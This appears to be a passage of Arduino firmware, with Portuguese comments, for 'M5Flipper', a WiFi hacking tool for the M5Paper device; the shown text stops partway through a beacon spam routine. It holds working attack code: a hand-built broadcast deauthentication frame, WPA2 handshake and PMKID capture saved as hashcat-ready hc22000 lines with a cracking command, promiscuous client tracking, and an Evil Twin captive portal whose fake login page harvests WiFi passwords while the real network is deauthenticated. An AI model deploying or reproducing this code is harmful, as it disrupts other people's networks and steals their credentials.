/*
 * M5Flipper v0.2 - Hardware Hacking Tool para M5Paper V1.1
 *
 * Features:
 *   - WiFi Scanner  (lista + detalhes)
 *   - Probe Monitor (802.11 promíscuo, channel hopping)
 *   - System Info   (RTC, bateria, RAM, Reiniciar, Desligar)
 *
 * NOTA: BLE Scanner removido temporariamente — ESP32 de 128KB de IRAM
 *       não suporta WiFi + BLE compilados juntos nesta versão do SDK.
 *       Será reativado quando disponível hardware externo (ex: módulo BLE).
 *
 * Biblioteca: M5Unified (Library Manager)
 * Board:      M5Stack > M5Paper
 */

#include <M5Unified.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_timer.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SPI.h>
#include <SD.h>

// ── Dimensões (landscape, rotação 90° CW) ───────────────────
#define SCR_W  960
#define SCR_H  540

// ── SD Card (barramento SPI compartilhado com EPD — M5Paper V1.1) ──
// ATENÇÃO: GPIO23 = EPD_RST — NÃO usar como MOSI/qualquer SPI!
// SD e EPD (IT8951) dividem o mesmo barramento: CLK=14, MOSI=12, MISO=13
#define SD_CS   4
#define SD_CLK  14
#define SD_MOSI 12
#define SD_MISO 13

// ── Paleta RGB565 (mapeada para cinza no EPD) ────────────────
#define C_BLACK  0x0000
#define C_DGRAY  0x4210
#define C_GRAY   0x8410
#define C_LGRAY  0xC618
#define C_WHITE  0xFFFF

// ── Estados da aplicação ─────────────────────────────────────
enum State {
  S_MENU,
  S_WIFI_LIST, S_WIFI_DETAIL,
  S_DEAUTH,
  S_PROBE,
  S_SYSINFO,
  S_EDIT_TIME, S_EDIT_DATE,
  S_PMKID,
  S_BEACON,
  S_CLIENT,
  S_SD_BROWSER,
  S_SD_PREVIEW,
  S_EVILTWIN
};
State gState = S_MENU;

// ── Structs ──────────────────────────────────────────────────
struct APInfo {
  String ssid, bssid;
  int32_t rssi;
  uint8_t channel;
  wifi_auth_mode_t auth;
};

#define MAX_PROBES 50
struct ProbeInfo {
  char mac[18];
  char ssid[33];
  int  rssi;
  int  count;
};

// ── Globals ──────────────────────────────────────────────────
M5Canvas canvas(&M5.Display);

bool gSdReady = false;
char gSdMsg[64] = {};   // último arquivo gravado no SD (para exibir na UI)

// Edição de hora/data (System Info)
m5::rtc_time_t gEditTime = {};
m5::rtc_date_t gEditDate = {};

static const int VISIBLE_ROWS = 8;
static const int ROW_H        = 55;
static const int LIST_TOP     = 76;

// WiFi
APInfo gAPs[30];
int    gAPCount = 0, gSelected = -1, gScrollOff = 0;

// Deauth Attack
struct DeauthTarget {
  char    ssid[33];
  uint8_t bssid[6];
  uint8_t channel;
};

// Frame 802.11 de deautenticação (broadcast: AP → todos os clientes)
uint8_t gDeauthFrame[26] = {
  0xC0, 0x00,                          // Frame Control: Management + Deauth (subtype=12)
  0x00, 0x00,                          // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast — desconecta todos os clientes
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA:    BSSID do AP (preenchido em startDeauth)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: BSSID do AP (preenchido em startDeauth)
  0x00, 0x00,                          // Sequence Control
  0x07, 0x00                           // Reason: Class 3 frame from unassociated STA
};

// PMKID capturado (attack sem cliente — EAPOL Frame 1 → Key Data KDE)
struct PMKIDResult {
  uint8_t pmkid[16];   // 16 bytes do PMKID extraído
  uint8_t apMac[6];    // BSSID do AP
  uint8_t staMac[6];   // MAC do cliente que iniciou associação
};

// Handshake WPA2 capturado (frames EAPOL 1 e 2)
struct WPAHandshake {
  uint8_t  clientMac[6];
  uint8_t  anonce[32];     // Frame 1: AP → STA
  uint8_t  snonce[32];     // Frame 2: STA → AP
  uint8_t  mic[16];        // MIC do Frame 2 (alvo do crack)
  uint8_t  eapolF2[300];   // Frame EAPOL 2 raw (para hc22000)
  uint16_t eapolF2Len;
  bool     hasFrame1;
  bool     hasFrame2;
};

DeauthTarget      gDeauthTarget;
WPAHandshake      gHandshake;
volatile bool     gHandshakeComplete = false;
SemaphoreHandle_t gHandshakeMutex   = nullptr;

// PMKID
PMKIDResult       gPmkid;
volatile bool     gPmkidFound      = false;
SemaphoreHandle_t gPmkidMutex      = nullptr;
bool              gPmkidRunning    = false;
uint32_t          gPmkidStartTime  = 0;
uint32_t          gLastPmkidRefresh = 0;

// Beacon Spam
enum BeaconMode { BMODE_RANDOM = 0, BMODE_CLONE = 1 };
struct BeaconState {
  BeaconMode mode;
  uint8_t    channel;
  uint32_t   sentCount;
  uint32_t   lastTx;
  char       ssidList[8][33];  // histórico circular de SSIDs transmitidos
  uint8_t    macList[8][6];    // MACs correspondentes
  int        listHead;         // índice do SSID activo
  int        listCount;        // quantos slots preenchidos
  char       cloneSsid[33];   // SSID clonado (BMODE_CLONE)
  uint8_t    cloneMac[6];     // MAC clonado (BMODE_CLONE)
};
BeaconState gBeacon          = {};
bool        gBeaconRunning   = false;
uint32_t    gLastBeaconRefresh = 0;

// Client Tracker
#define MAX_CLIENTS 40
struct ClientInfo {
  uint8_t  mac[6];     // endereço MAC do cliente (STA)
  uint8_t  bssid[6];   // BSSID do AP ao qual está associado
  int      rssi;       // último RSSI observado
  uint32_t frames;     // total de frames detectados
  uint32_t lastSeen;   // millis() da última actividade
  char     apSsid[17]; // SSID do AP (preenchido ao exibir, se conhecido)
};
ClientInfo        gClients[MAX_CLIENTS];
volatile int      gClientCount       = 0;
SemaphoreHandle_t gClientMutex       = nullptr;
bool              gClientRunning     = false;
bool              gClientFilterAP    = false; // true = filtra pelo gDeauthTarget.bssid
uint8_t           gClientChannel     = 1;
uint32_t          gClientLastChan    = 0;
int               gClientScrollOff   = 0;
volatile bool     gClientDirty       = false;
uint32_t          gLastClientRefresh = 0;

volatile bool     gDeauthRunning   = false;
volatile uint32_t gDeauthPackets   = 0;
uint32_t          gLastDeauthTx    = 0;
uint32_t          gLastDeauthRefresh = 0;
uint32_t          gDeauthStartTime = 0;

// Probe Monitor
ProbeInfo         gProbes[MAX_PROBES];
volatile int      gProbeCount    = 0;
volatile bool     gProbeRunning  = false;
volatile bool     gProbeDirty    = false;
int               gProbeScrollOff = 0;
SemaphoreHandle_t gProbeMutex    = nullptr;
uint32_t          gLastProbeRefresh = 0;
uint8_t           gProbeChannel  = 1;
uint32_t          gLastChanChange = 0;

// SD Analyzer
enum FileType { FT_WIFI_SCAN=0, FT_HANDSHAKE=1, FT_PMKID=2, FT_CLIENTS=3, FT_CREDS=4, FT_OTHER=5 };
static const char *FT_LABELS[] = { "WiFi Scan","Handshake","PMKID","Clientes","EvilTwin","Outro" };

struct SdFileEntry {
  char     name[36];
  uint32_t size;
  FileType ftype;
};

#define MAX_SD_FILES   30
#define PREV_MAX_LINES 20
#define PREV_COL_LEN   96

struct SdPreview {
  char     lines[PREV_MAX_LINES][PREV_COL_LEN]; // linhas brutas
  int      lineCount;
  FileType ftype;
  char     filename[36];
  // Campos parsed (hc22000)
  bool     hasParsed;
  char     hashType[4];   // "01" ou "02"
  char     ssid[33];
  char     bssidStr[18];
  char     staStr[18];
  char     keyHex[33];    // PMKID ou MIC (32 hex chars)
  char     hashLine[260]; // linha WPA* completa
  // Campos parsed (WiFi Scan CSV)
  int      scanCount;
  int      bestRssi;
  char     bestSsid[33];
};

SdFileEntry gSdEntries[MAX_SD_FILES];
int         gSdEntryCount    = 0;
int         gSdEntrySelIdx   = -1;
int         gSdBrowserScroll = 0;
SdPreview   gSdPrev          = {};
int         gSdPreviewScroll = 0;

// Evil Twin (AP Falso + Captive Portal)
struct EvilCred {
  char     pass[64];   // password submetida pelo utilizador
  char     ip[16];     // IP do cliente
  uint32_t when;       // millis() da captura
};
#define MAX_CREDS 10

DNSServer  gDnsServer;
WebServer  gWebServer(80);

EvilCred  gCreds[MAX_CREDS];
int       gCredCount      = 0;
bool      gEvilRunning    = false;
bool      gEvilDeauth     = true;   // enviar deauth contínuo ao AP real
char      gEvilSsid[33]   = {};
uint8_t   gEvilChannel    = 1;
char      gEvilCredFile[48] = {};   // caminho do ficheiro de credenciais no SD
uint32_t  gLastEvilRefresh = 0;
uint32_t  gLastEvilDeauth  = 0;

// ── Páginas HTML do captive portal ──────────────────────────
static const char EVIL_HTML_LOGIN[] =
  "<!DOCTYPE html><html><head>"
  "<meta charset='utf-8'>"
  "<meta name='viewport' content='width=device-width,initial-scale=1'>"
  "<title>WiFi Login</title>"
  "<style>"
  "*{box-sizing:border-box}"
  "body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;"
       "align-items:center;justify-content:center;min-height:100vh;margin:0}"
  ".c{background:#fff;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,.12);"
      "padding:36px 32px;width:340px;max-width:90vw}"
  "h2{margin:0 0 6px;color:#1a1a2e;font-size:20px;text-align:center}"
  ".s{text-align:center;color:#777;font-size:13px;margin-bottom:22px}"
  "b{color:#0055aa}"
  "label{font-size:13px;color:#555;display:block;margin-bottom:4px}"
  "input{width:100%;padding:11px 14px;border:1px solid #ddd;border-radius:6px;"
         "font-size:15px;margin-bottom:18px;outline:none}"
  "input:focus{border-color:#0055aa}"
  "button{width:100%;padding:13px;background:#0055aa;color:#fff;border:none;"
          "border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}"
  "</style></head>"
  "<body><div class='c'>"
  "<h2>&#128274; WiFi Login</h2>"
  "<p class='s'>Join network <b>%SSID%</b></p>"
  "<form method='POST' action='/login'>"
  "<label>Password</label>"
  "<input type='password' name='pass' placeholder='WiFi password' required autocomplete='off'>"
  "<button>Connect</button>"
  "</form></div></body></html>";

static const char EVIL_HTML_OK[] =
  "<!DOCTYPE html><html><head>"
  "<meta charset='utf-8'>"
  "<meta http-equiv='refresh' content='4;url=http://www.google.com'>"
  "<title>Connected</title>"
  "<style>body{font-family:Arial;background:#f0f2f5;display:flex;align-items:center;"
  "justify-content:center;min-height:100vh;margin:0}"
  ".c{background:#fff;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,.12);"
  "padding:40px;text-align:center}"
  "h2{color:#28a745;margin-bottom:8px}p{color:#777}</style>"
  "</head><body><div class='c'>"
  "<h2>&#10004; Connected!</h2>"
  "<p>Authenticating to network...</p>"
  "<p><small>Redirecting in a moment</small></p>"
  "</div></body></html>";

// ════════════════════════════════════════════════════════════
//  EPD push helpers
// ════════════════════════════════════════════════════════════

void pushQuality() {
  M5.Display.setEpdMode(epd_mode_t::epd_quality);
  canvas.pushSprite(0, 0);
}

void pushFast() {
  M5.Display.setEpdMode(epd_mode_t::epd_fast);
  canvas.pushSprite(0, 0);
}

// ════════════════════════════════════════════════════════════
//  Utilitários
// ════════════════════════════════════════════════════════════

bool inRect(int tx, int ty, int x, int y, int w, int h) {
  return tx >= x && tx < x+w && ty >= y && ty < y+h;
}

const char* authLabel(wifi_auth_mode_t a) {
  switch (a) {
    case WIFI_AUTH_OPEN:          return "OPEN";
    case WIFI_AUTH_WEP:           return "WEP";
    case WIFI_AUTH_WPA_PSK:       return "WPA";
    case WIFI_AUTH_WPA2_PSK:      return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:  return "WPA/2";
    case WIFI_AUTH_WPA3_PSK:      return "WPA3";
    default:                      return "?";
  }
}

int rssiLevel(int r) {
  if (r >= -50) return 4;
  if (r >= -65) return 3;
  if (r >= -75) return 2;
  if (r >= -85) return 1;
  return 0;
}

// ── Componentes visuais ──────────────────────────────────────

void drawSigBars(int x, int y, int lv) {
  for (int i = 0; i < 4; i++) {
    int bh = 8 + i * 6;
    int bx = x + i * 14;
    int by = y + 24 - bh;
    if (i < lv) canvas.fillRect(bx, by, 10, bh, C_BLACK);
    else        canvas.drawRect(bx, by, 10, bh, C_LGRAY);
  }
}

void drawHeader(const char *title) {
  canvas.fillRect(0, 0, SCR_W, 62, C_BLACK);
  canvas.setTextColor(C_WHITE);
  canvas.setTextSize(3);
  canvas.setTextDatum(TL_DATUM);
  canvas.drawString(title, 18, 12);
  char buf[20];
  sprintf(buf, "BAT %3d%%", M5.Power.getBatteryLevel());
  canvas.setTextSize(2);
  canvas.drawString(buf, SCR_W - 145, 18);
}

void drawBtn(int x, int y, int w, int h, const char *lbl, bool inv = false) {
  if (inv) {
    canvas.fillRect(x, y, w, h, C_BLACK);
    canvas.setTextColor(C_WHITE);
  } else {
    canvas.fillRect(x, y, w, h, C_WHITE);
    canvas.drawRect(x,   y,   w,   h,   C_BLACK);
    canvas.drawRect(x+1, y+1, w-2, h-2, C_BLACK);
    canvas.setTextColor(C_BLACK);
  }
  canvas.setTextSize(2);
  canvas.setTextDatum(MC_DATUM);
  canvas.drawString(lbl, x + w/2, y + h/2);
  canvas.setTextDatum(TL_DATUM);
}

// Botão desabilitado (cinza, não responde ao toque)
void drawBtnDisabled(int x, int y, int w, int h, const char *lbl) {
  canvas.fillRect(x, y, w, h, C_LGRAY);
  canvas.drawRect(x, y, w, h, C_GRAY);
  canvas.setTextColor(C_GRAY);
  canvas.setTextSize(2);
  canvas.setTextDatum(MC_DATUM);
  canvas.drawString(lbl, x + w/2, y + h/2);
  canvas.setTextDatum(TL_DATUM);
}

// ════════════════════════════════════════════════════════════
//  Boot / Splash Screen
// ════════════════════════════════════════════════════════════

// Ecrã de arranque, reinício e desligamento.
// status: texto exibido na barra inferior (ex: "Inicializando...",
//         "Reiniciando..." ou "Desligando..."). Pode ser nullptr.
void drawBootScreen(const char *status) {
  canvas.fillSprite(C_WHITE);

  // ── Logotipo M5Stack ─────────────────────────────────────
  // Rectângulo preto com cantos arredondados
  canvas.fillRoundRect(350, 48, 260, 158, 18, C_BLACK);

  canvas.setTextDatum(MC_DATUM);

  // "M5" branco grande
  canvas.setTextSize(6); canvas.setTextColor(C_WHITE);
  canvas.drawString("M5", 480, 104);

  // Linha separadora interior (cinza)
  canvas.drawLine(368, 140, 592, 140, C_GRAY);

  // "Stack" branco menor
  canvas.setTextSize(2); canvas.setTextColor(C_WHITE);
  canvas.drawString("Stack", 480, 180);

  // ── Linha divisória abaixo do logo ───────────────────────
  canvas.drawLine(60, 228, SCR_W-60, 228, C_LGRAY);

  // ── Nome do projecto ─────────────────────────────────────
  canvas.setTextSize(5); canvas.setTextColor(C_BLACK);
  canvas.drawString("M5Flipper", 480, 302);

  // ── Subtítulo ────────────────────────────────────────────
  canvas.setTextSize(2); canvas.setTextColor(C_DGRAY);
  canvas.drawString("Hardware Hacking Tool", 480, 364);

  // ── Versão e hardware ────────────────────────────────────
  canvas.setTextSize(1); canvas.setTextColor(C_GRAY);
  canvas.drawString("v0.2  |  M5Paper V1.1  |  ESP32-D0WDQ6-V3", 480, 406);

  // ── Barra de status na base ──────────────────────────────
  if (status && status[0]) {
    canvas.fillRect(0, SCR_H - 58, SCR_W, 58, C_BLACK);
    canvas.setTextSize(2); canvas.setTextColor(C_WHITE);
    canvas.drawString(status, SCR_W / 2, SCR_H - 29);
  }

  canvas.setTextDatum(TL_DATUM);
  pushQuality();
}

// ════════════════════════════════════════════════════════════
//  SD Card — funções de gravação
// ════════════════════════════════════════════════════════════

// Gera prefixo de timestamp a partir do RTC (ex: "20260413_142530")
static void rtcTimestamp(char *out, size_t maxLen) {
  m5::rtc_datetime_t dt; M5.Rtc.getDateTime(&dt);
  snprintf(out, maxLen, "%04d%02d%02d_%02d%02d%02d",
           dt.date.year, dt.date.month, dt.date.date,
           dt.time.hours, dt.time.minutes, dt.time.seconds);
}

// Salva resultado do WiFi Scan como CSV no SD
void saveWifiScan() {
  if (!gSdReady || gAPCount == 0) return;

  char ts[20]; rtcTimestamp(ts, sizeof(ts));
  char filename[40];
  snprintf(filename, sizeof(filename), "/wifi_%s.csv", ts);

  File f = SD.open(filename, FILE_WRITE);
  if (!f) { Serial.println("[SD] Erro ao criar arquivo de scan."); return; }

  f.println("SSID,BSSID,Canal,Seguranca,RSSI_dBm");
  for (int i = 0; i < gAPCount; i++) {
    f.printf("\"%s\",%s,%d,%s,%d\n",
             gAPs[i].ssid.isEmpty() ? "[Oculto]" : gAPs[i].ssid.c_str(),
             gAPs[i].bssid.c_str(),
             gAPs[i].channel,
             authLabel(gAPs[i].auth),
             gAPs[i].rssi);
  }
  f.close();

  snprintf(gSdMsg, sizeof(gSdMsg), "SD: %s", filename);
  Serial.printf("[SD] Scan WiFi salvo em %s (%d redes)\n", filename, gAPCount);
}

// Salva handshake WPA2 no formato hc22000 no SD
void saveHandshake() {
  if (!gSdReady) return;

  char ts[20]; rtcTimestamp(ts, sizeof(ts));
  char filename[48];
  snprintf(filename, sizeof(filename), "/hs_%s.hc22000", ts);

  File f = SD.open(filename, FILE_WRITE);
  if (!f) { Serial.println("[SD] Erro ao criar arquivo de handshake."); return; }

  // Cabeçalho informativo
  f.printf("# M5Flipper — WPA2 Handshake\n");
  f.printf("# SSID : %s\n", gDeauthTarget.ssid);
  f.printf("# BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
           gDeauthTarget.bssid[0], gDeauthTarget.bssid[1], gDeauthTarget.bssid[2],
           gDeauthTarget.bssid[3], gDeauthTarget.bssid[4], gDeauthTarget.bssid[5]);
  f.printf("# hashcat -m 22000 %s wordlist.txt\n", filename);

  // Linha hc22000
  f.print("WPA*02*");
  for (int i = 0; i < 16; i++) f.printf("%02x", gHandshake.mic[i]);
  f.print("*");
  for (int i = 0; i < 6;  i++) f.printf("%02x", gDeauthTarget.bssid[i]);
  f.print("*");
  for (int i = 0; i < 6;  i++) f.printf("%02x", gHandshake.clientMac[i]);
  f.print("*");
  for (size_t i = 0; i < strlen(gDeauthTarget.ssid); i++)
    f.printf("%02x", (uint8_t)gDeauthTarget.ssid[i]);
  f.print("*");
  for (int i = 0; i < 32; i++) f.printf("%02x", gHandshake.anonce[i]);
  f.print("*");
  for (int i = 0; i < gHandshake.eapolF2Len; i++) f.printf("%02x", gHandshake.eapolF2[i]);
  f.println("*01");

  f.close();

  snprintf(gSdMsg, sizeof(gSdMsg), "SD: %s", filename);
  Serial.printf("[SD] Handshake salvo em %s\n", filename);
}

// ════════════════════════════════════════════════════════════
//  Client Tracker
// ════════════════════════════════════════════════════════════

// Callback promíscuo: captura STAs a partir de frames de dados e management
void clientCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t  *data = pkt->payload;
  uint16_t  len  = pkt->rx_ctrl.sig_len;
  if (len < 24) return;

  uint8_t fc0     = data[0];
  uint8_t fc1     = data[1];
  uint8_t ftype   = (fc0 >> 2) & 0x03;
  uint8_t subtype = (fc0 >> 4) & 0x0F;

  uint8_t *bssidPtr = nullptr;
  uint8_t *staPtr   = nullptr;

  if (ftype == 0x02) {                      // Data frame
    uint8_t toFromDS = fc1 & 0x03;
    if (toFromDS == 0x01) {                 // STA → AP: addr1=BSSID, addr2=STA
      bssidPtr = &data[4]; staPtr = &data[10];
    } else if (toFromDS == 0x02) {          // AP → STA: addr2=BSSID, addr1=STA
      bssidPtr = &data[10]; staPtr = &data[4];
    } else return;
  } else if (ftype == 0x00) {               // Management frame
    // AssocReq(0), ReassocReq(2), Disassoc(10), Auth(11), Deauth(12)
    // addr1=AP(BSSID), addr2=STA
    if (subtype != 0 && subtype != 2 && subtype != 10 &&
        subtype != 11 && subtype != 12) return;
    bssidPtr = &data[4]; staPtr = &data[10];
    if (bssidPtr[0] == 0xFF) return; // ignora broadcast
  } else return;

  if (!staPtr || (staPtr[0] & 0x01)) return; // descarta broadcast/multicast

  // Filtro de AP (quando lançado a partir de WiFi Detail)
  if (gClientFilterAP && memcmp(bssidPtr, gDeauthTarget.bssid, 6) != 0) return;

  if (gClientMutex == nullptr) return;
  if (xSemaphoreTake(gClientMutex, 0) != pdTRUE) return;

  // Actualiza registo existente
  for (int i = 0; i < gClientCount; i++) {
    if (memcmp(gClients[i].mac, staPtr, 6) == 0) {
      gClients[i].rssi     = pkt->rx_ctrl.rssi;
      gClients[i].frames++;
      gClients[i].lastSeen = millis();
      memcpy(gClients[i].bssid, bssidPtr, 6); // actualiza BSSID (pode mudar de AP)
      gClientDirty = true;
      xSemaphoreGive(gClientMutex);
      return;
    }
  }

  // Novo cliente
  if (gClientCount < MAX_CLIENTS) {
    memcpy(gClients[gClientCount].mac,   staPtr,   6);
    memcpy(gClients[gClientCount].bssid, bssidPtr, 6);
    gClients[gClientCount].rssi      = pkt->rx_ctrl.rssi;
    gClients[gClientCount].frames    = 1;
    gClients[gClientCount].lastSeen  = millis();
    gClients[gClientCount].apSsid[0] = '\0';
    gClientCount++;
    gClientDirty = true;
  }

  xSemaphoreGive(gClientMutex);
}

// Tenta resolver o BSSID de um cliente para o SSID conhecido (chamado na task principal)
static void resolveApSsid(ClientInfo &c) {
  // Compara BSSID contra a lista do último scan
  char bssidStr[18];
  snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           c.bssid[0], c.bssid[1], c.bssid[2],
           c.bssid[3], c.bssid[4], c.bssid[5]);
  for (int i = 0; i < gAPCount; i++) {
    if (gAPs[i].bssid.equalsIgnoreCase(bssidStr)) {
      strncpy(c.apSsid, gAPs[i].ssid.isEmpty() ? "[Oculto]" : gAPs[i].ssid.c_str(), 16);
      c.apSsid[16] = '\0';
      return;
    }
  }
  c.apSsid[0] = '\0'; // não encontrado
}

void startClient(int apIdx) {
  if (xSemaphoreTake(gClientMutex, portMAX_DELAY) == pdTRUE) {
    gClientCount = 0; gClientDirty = false; gClientScrollOff = 0;
    memset(gClients, 0, sizeof(gClients));
    xSemaphoreGive(gClientMutex);
  }

  if (apIdx >= 0 && apIdx < gAPCount) {
    // Modo filtrado: fixado no canal do AP alvo
    gClientFilterAP = true;
    strncpy(gDeauthTarget.ssid,
            gAPs[apIdx].ssid.isEmpty() ? "[Oculto]" : gAPs[apIdx].ssid.c_str(), 32);
    parseBssid(gAPs[apIdx].bssid, gDeauthTarget.bssid);
    gDeauthTarget.channel = gAPs[apIdx].channel;
    gClientChannel = gDeauthTarget.channel;
  } else {
    // Modo global: channel hopping
    gClientFilterAP = false;
    gClientChannel  = 1;
  }

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(clientCallback);
  esp_wifi_set_channel(gClientChannel, WIFI_SECOND_CHAN_NONE);

  gClientRunning  = true;
  gClientLastChan = millis();
  gLastClientRefresh = 0;
}

void stopClient() {
  gClientRunning = false;
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  esp_wifi_set_promiscuous(false);
}

// Salva lista de clientes em CSV no SD
void saveClients() {
  if (!gSdReady || gClientCount == 0) return;
  char ts[20]; rtcTimestamp(ts, sizeof(ts));
  char filename[48];
  snprintf(filename, sizeof(filename), "/clients_%s.csv", ts);
  File f = SD.open(filename, FILE_WRITE);
  if (!f) return;
  f.println("MAC_Cliente,BSSID_AP,SSID_AP,RSSI_dBm,Frames");
  if (xSemaphoreTake(gClientMutex, portMAX_DELAY) == pdTRUE) {
    for (int i = 0; i < gClientCount; i++) {
      ClientInfo &c = gClients[i];
      f.printf("%02X:%02X:%02X:%02X:%02X:%02X,"
               "%02X:%02X:%02X:%02X:%02X:%02X,"
               "\"%s\",%d,%lu\n",
               c.mac[0],c.mac[1],c.mac[2],c.mac[3],c.mac[4],c.mac[5],
               c.bssid[0],c.bssid[1],c.bssid[2],c.bssid[3],c.bssid[4],c.bssid[5],
               c.apSsid, c.rssi, c.frames);
    }
    xSemaphoreGive(gClientMutex);
  }
  f.close();
  snprintf(gSdMsg, sizeof(gSdMsg), "SD: %s", filename);
  Serial.printf("[SD] Clientes salvos em %s\n", filename);
}

// ── Ecrã de Client Tracker ───────────────────────────────────
void drawClient() {
  canvas.fillSprite(C_WHITE);
  drawHeader("Client Tracker");

  drawBtn(SCR_W-328, 8, 110, 46, gClientRunning ? "Parar" : "Iniciar", gClientRunning);
  drawBtn(SCR_W-210, 8,  92, 46, gClientFilterAP ? "Filtrado" : "Global");
  drawBtn(SCR_W-110, 8, 102, 46, "Menu");

  // Barra de status
  canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
  if (gClientRunning) {
    char st[64];
    if (gClientFilterAP)
      snprintf(st, sizeof(st), "CAPTURANDO  |  AP: %s  |  Canal: %d  |  %d cliente(s)",
               gDeauthTarget.ssid, gClientChannel, (int)gClientCount);
    else
      snprintf(st, sizeof(st), "CAPTURANDO (GLOBAL)  |  Canal: %d  |  %d cliente(s)",
               gClientChannel, (int)gClientCount);
    canvas.drawString(st, 18, LIST_TOP - 18);
  } else {
    char st[48];
    snprintf(st, sizeof(st), "PARADO  |  %d cliente(s) capturado(s)", (int)gClientCount);
    canvas.drawString(st, 18, LIST_TOP - 18);
  }
  canvas.drawLine(10, LIST_TOP-4, SCR_W-16, LIST_TOP-4, C_BLACK);

  // Cabeçalho da tabela
  int hy = LIST_TOP + 2;
  canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
  canvas.drawString("MAC Cliente",     22, hy);
  canvas.drawString("BSSID AP",       240, hy);
  canvas.drawString("SSID",           480, hy);
  canvas.drawString("RSSI",           660, hy);
  canvas.drawString("SIG",            740, hy);
  canvas.drawString("Frames",         810, hy);
  canvas.drawString("Visto",          890, hy);
  canvas.drawLine(10, hy+14, SCR_W-16, hy+14, C_DGRAY);

  if (gClientCount == 0) {
    canvas.setTextSize(2); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(C_BLACK);
    canvas.drawString(gClientRunning
                      ? "Aguardando clientes..." : "Sem dados. Toque em Iniciar.",
                      SCR_W/2, SCR_H/2 + 40);
    canvas.setTextDatum(TL_DATUM);
    pushFast(); return;
  }

  // Copia buffer (thread-safe) e resolve SSIDs dos APs
  xSemaphoreTake(gClientMutex, portMAX_DELAY);
  int count = gClientCount;
  ClientInfo local[MAX_CLIENTS];
  memcpy(local, (void *)gClients, count * sizeof(ClientInfo));
  xSemaphoreGive(gClientMutex);

  for (int i = 0; i < count; i++) resolveApSsid(local[i]);

  int tableTop = hy + 18;
  int tROW_H   = 44;
  int visRows  = 8;
  uint32_t now = millis();

  for (int i = 0; i < visRows; i++) {
    int idx = gClientScrollOff + i; if (idx >= count) break;
    ClientInfo &c = local[idx];
    int ry = tableTop + i * tROW_H;
    canvas.fillRect(10, ry, SCR_W-26, tROW_H-2, i%2==0 ? C_WHITE : C_LGRAY);
    canvas.setTextColor(C_BLACK); canvas.setTextSize(1);

    // MAC cliente
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             c.mac[0],c.mac[1],c.mac[2],c.mac[3],c.mac[4],c.mac[5]);
    canvas.drawString(macStr, 22, ry+14);

    // BSSID AP
    char bssidStr[18];
    snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             c.bssid[0],c.bssid[1],c.bssid[2],c.bssid[3],c.bssid[4],c.bssid[5]);
    canvas.setTextColor(C_DGRAY);
    canvas.drawString(bssidStr, 240, ry+14);

    // SSID do AP (se conhecido)
    canvas.setTextColor(C_BLACK);
    if (c.apSsid[0]) {
      String ss = String(c.apSsid);
      if (ss.length() > 10) ss = ss.substring(0, 9) + "~";
      canvas.drawString(ss, 480, ry+14);
    } else {
      canvas.setTextColor(C_LGRAY);
      canvas.drawString("?", 480, ry+14);
    }

    // RSSI
    char rs[10]; sprintf(rs, "%d", c.rssi);
    canvas.setTextColor(C_BLACK);
    canvas.drawString(rs, 660, ry+14);
    drawSigBars(740, ry+8, rssiLevel(c.rssi));

    // Frames
    canvas.setTextSize(2); canvas.setTextColor(C_BLACK);
    char fcnt[10]; sprintf(fcnt, "%lu", c.frames);
    canvas.drawString(fcnt, 810, ry+10);

    // Tempo desde última detecção
    uint32_t ago = (now - c.lastSeen) / 1000;
    char tm[8];
    if (ago < 60)        sprintf(tm, "%lus",  ago);
    else if (ago < 3600) sprintf(tm, "%lum",  ago/60);
    else                 sprintf(tm, "%luh",  ago/3600);
    canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
    canvas.drawString(tm, 890, ry+14);
  }

  // Scrollbar
  int sbX = SCR_W-12, sbH = visRows * tROW_H, sbTop = tableTop;
  canvas.drawRect(sbX, sbTop, 4, sbH, C_LGRAY);
  if (count > visRows) {
    int th  = sbH * visRows / count;
    int thy = sbTop + sbH * gClientScrollOff / count;
    canvas.fillRect(sbX, thy, 4, max(th, 12), C_BLACK);
  }

  // Paginação + SD msg
  int footY = SCR_H - 44;
  char pg[32];
  sprintf(pg, "%d-%d de %d", gClientScrollOff+1,
          min(gClientScrollOff+visRows, count), count);
  canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
  canvas.setTextDatum(MC_DATUM); canvas.drawString(pg, SCR_W/2, footY+20);
  if (gSdMsg[0]) {
    canvas.setTextDatum(TR_DATUM);
    canvas.drawString(gSdMsg, SCR_W-10, footY+20);
  }
  canvas.setTextDatum(TL_DATUM);
  if (gClientScrollOff > 0)                     drawBtn(10,  footY, 130, 38, "^ Anterior");
  if (gClientScrollOff + visRows < count)       drawBtn(150, footY, 130, 38, "v Proximo");
  drawBtn(700, footY, 120, 38, "Exportar");

  pushFast();
}

// ════════════════════════════════════════════════════════════
//  Beacon Spam
// ════════════════════════════════════════════════════════════

void generateRandomMAC(uint8_t *mac) {
  for (int i = 0; i < 6; i++) mac[i] = esp_random() & 0xFF;
  mac[0] = (mac[0] & 0xFE) | 0x02; // locally administered, unicast
}

void generateRandomSSID(char *out, int maxLen) {
  static const char *prefixes[] = {
    "NET_", "WiFi_", "Home_", "CORP-", "Guest_",
